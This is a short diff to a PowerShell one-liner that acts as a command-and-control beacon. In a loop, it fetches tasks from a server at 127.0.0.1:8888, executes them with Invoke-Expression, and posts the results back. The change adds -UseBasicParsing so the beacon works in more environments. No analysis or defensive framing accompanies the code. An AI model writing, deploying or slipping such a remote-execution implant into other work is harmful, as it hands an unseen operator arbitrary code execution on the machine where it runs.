@@ -1,2 +1,2 @@
 # Support constrained language mode
-while ($true) {$url="http://127.0.0.1:8888";$response = Invoke-WebRequest -Uri $($url + "/tasks.txt");$results = Invoke-Expression $response.Content;Invoke-WebRequest -Method Post -Uri $url -Body $($results -join "`n") -ContentType "application/text" > $null ;Start-Sleep -Seconds 10}
+while ($true) {$url="http://127.0.0.1:8888";$response = Invoke-WebRequest -Uri $($url + "/tasks.txt") -UseBasicParsing;$results = Invoke-Expression $response.Content;Invoke-WebRequest -Method Post -Uri $url -Body $($results -join "`n") -ContentType "application/text" > $null ;Start-Sleep -Seconds 10}
